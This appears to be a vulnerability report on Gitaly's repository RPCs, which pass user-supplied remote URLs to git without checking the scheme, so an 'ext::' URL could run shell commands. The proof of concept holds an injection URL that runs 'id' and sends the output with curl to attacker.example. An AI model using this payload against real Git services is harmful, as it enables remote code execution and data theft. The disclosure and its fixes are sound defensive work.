### Title
Unvalidated remote URL scheme allows Git `ext::` transport helper injection leading to RCE - (File: `internal/gitaly/service/repository/create_repository_from_url.go`)

### Summary
The external report's bug class is "unvalidated/unfiltered URL passed to a proxy, allowing dangerous URI schemes (`data:text/html`) to be interpreted and executed." The unprivileged analog in Gitaly is the family of RPCs that accept an attacker/user-supplied remote URL (`CreateRepositoryFromURL`, `FetchRemote`, `UpdateRemoteMirror`, `FindRemoteRootRef`) and pass it, with no scheme allow-listing, straight into `git clone`/`git fetch`/`git push`/`git ls-remote` argument lists.

### Finding Description
`cloneFromURLCommand` in `internal/gitaly/service/repository/create_repository_from_url.go` only calls `url.Parse(repoURL)` to strip user/password credentials — it never inspects or restricts `u.Scheme`: [1](#0-0) 

The resulting `urlString` is passed verbatim as an argument to `git clone`: [2](#0-1) 

The same unrestricted pattern is repeated in `buildCommandOpts` for `FetchRemote` and in `updateRemoteMirror` for `UpdateRemoteMirror`, where `remoteURL := req.GetRemoteParams().GetUrl()` / `remote.GetUrl()` flows directly into `git fetch`/`git push` via `remote.<name>.url` git config, again without scheme validation: [3](#0-2) [4](#0-3) 

The only place scheme is even inspected is `GetURLAndResolveConfig`, and only when an optional `resolved_address` is supplied — it recognizes `http://`, `https://`, `git://`, `ssh://`, else falls back to treating the string as an SCP-like `host:path` spec: [5](#0-4) 

When `resolved_address` is empty (which is optional/normal for many callers), no scheme check happens at all. This means URL values with Git's special "remote helper" schemes — most notably `ext::<command>` (git-remote-ext) — are accepted and handed to `git-clone(1)`/`git-fetch(1)`, which will invoke the remote helper and execute the embedded shell command with the privileges of the `gitaly` process. This is directly analogous to the report's root cause: an unfiltered `src`/URL value being handed to a rendering/execution primitive that interprets non-benign schemes (`data:text/html` executing script vs. `ext::` executing shell commands).

Tests confirm that even the `file://` scheme is accepted and used unmodified in these RPCs (e.g. `TestCreateRepositoryFromURL_fsck` clones `"file://" + sourceRepoPath`, and `find_remote_root_ref_test.go` uses `"file://" + remoteRepoPath`), demonstrating there is no scheme allow-list anywhere in this code path: [6](#0-5) 

### Impact Explanation
If an ordinary/unprivileged actor can control the `url` field of `CreateRepositoryFromURLRequest`, `FetchRemoteRequest.RemoteParams.Url`, or `UpdateRemoteMirrorRequest.Remote.Url` (e.g., via a project import/mirror feature that forwards a user-chosen URL to Gitaly), supplying an `ext::` URL results in arbitrary command execution on the Gitaly host — a full RCE, not merely information disclosure. This is High impact, matching or exceeding the referenced report's XSS impact rating.

### Likelihood Explanation
Likelihood is Low-to-Medium: exploitation requires a code path (mirror/import feature in an upstream Rails/GitLab caller) that lets an end user fully control the remote URL string reaching one of these RPCs without prior URL-scheme filtering at that layer. Gitaly itself performs no such filtering, so whether the vulnerability is reachable in practice depends on callers outside this repo; within Gitaly's own trust boundary, the RPCs are documented as trusting the caller-provided URL and are unauthenticated with respect to scheme.

### Recommendation
- Enforce an explicit allow-list of remote URL schemes (`http`, `https`, `git`, `ssh`, and SCP-like syntax) in `cloneFromURLCommand`, `buildCommandOpts` (fetch_remote.go), and `updateRemoteMirror`, rejecting anything else (in particular `ext::`, `fd::`, and other remote-helper schemes) before invoking `git clone`/`git fetch`/`git push`.
- Alternatively/additionally, pass `-c protocol.ext.allow=never -c protocol.allow=user` (or set `GIT_ALLOW_PROTOCOL`) as global git config/env on these invocations so that Git itself refuses non-allow-listed transport helpers regardless of URL parsing gaps.
- Apply the same validation consistently across `GetURLAndResolveConfig` so scheme checking isn't conditional on `resolved_address` being set.

### Proof of Concept
1. Attacker triggers `CreateRepositoryFromURL` (or `FetchRemote`/`UpdateRemoteMirror`) with:
   `url = "ext::sh -c 'id > /tmp/pwned; curl attacker.example/$(id)'"`
2. `cloneFromURLCommand` parses this with `url.Parse`, which succeeds (scheme `ext`), and no code path rejects the `ext` scheme.
3. The resulting string is passed as an argument to `git clone` / configured as `remote.<name>.url` for `git fetch`/`git push`.
4. Git's `ext` remote helper (`git-remote-ext`) executes the shell command embedded in the URL on the Gitaly node, yielding remote code execution.

```go
func buildCommandOpts(ctx context.Context, opts *localrepo.FetchOpts, req *gitalypb.FetchRemoteRequest) error {
	remoteURL := req.GetRemoteParams().GetUrl()
	var config []gitcmd.ConfigPair

	for _, refspec := range getRefspecs(req.GetRemoteParams().GetMirrorRefmaps()) {
		config = append(config, gitcmd.ConfigPair{
			Key: "remote.inmemory.fetch", Value: refspec,
		})
	}

	if resolvedAddress := req.GetRemoteParams().GetResolvedAddress(); resolvedAddress != "" {
		modifiedURL, resolveConfig, err := gitcmd.GetURLAndResolveConfig(remoteURL, resolvedAddress)
		if err != nil {
			return fmt.Errorf("couldn't get curloptResolve config: %w", err)
		}

		remoteURL = modifiedURL
		config = append(config, resolveConfig...)
	}

	config = append(config, gitcmd.ConfigPair{Key: "remote.inmemory.url", Value: remoteURL})
```

```go
func GetURLAndResolveConfig(remoteURL string, resolvedAddress string) (string, []ConfigPair, error) {
	if remoteURL == "" {
		return "", nil, fmt.Errorf("URL is empty")
	}

	if resolvedAddress == "" {
		return "", nil, fmt.Errorf("resolved address is empty")
	}

	resolvedIP := net.ParseIP(resolvedAddress)
	if resolvedIP == nil {
		return "", nil, fmt.Errorf("resolved address has invalid IPv4/IPv6 address")
	}

	switch {
	case strings.HasPrefix(remoteURL, "http://"), strings.HasPrefix(remoteURL, "https://"), strings.HasPrefix(remoteURL, "git://"):
		return getURLAndResolveConfigForURL(remoteURL, resolvedAddress)
	case strings.HasPrefix(remoteURL, "ssh://"):
		return getURLAndResolveConfigForSSH(remoteURL, resolvedAddress)
	default:
		return getURLAndResolveConfigForSCP(remoteURL, resolvedAddress)
	}
```
